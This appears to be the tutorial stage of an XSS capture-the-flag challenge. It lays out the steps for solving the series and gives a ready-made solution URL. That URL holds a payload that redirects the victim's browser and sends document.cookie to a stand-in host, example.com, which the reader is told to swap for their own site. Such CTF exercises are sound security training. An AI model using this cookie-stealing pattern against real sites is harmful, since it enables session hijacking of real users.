# Stage1[Tutorial]

## Question

This stage is for tutorial. You solve Senbon XSS challenges with the order below.

1. Inspect question page and find XSS vulenrability.
(The page for this stage -> http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/)
2. Make a URL contains XSS payload (runs some code to steal the flag in somewhere) for the question page.
3. Submit the URL from `URL form`.
4. Stealing the FLAG, submit the FLAG from `FLAG form`.

So, in this stage, you just make the url like below and submit.

`http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/?location=%22http://example.com/?%22%2Bdocument.cookie`

For tutorial, please replace `example.com` to your site and submit the URL from `URL form`. The victim browser will access your url, and when your XSS payload successfully runs on the browser, the browser sends you the FLAG.
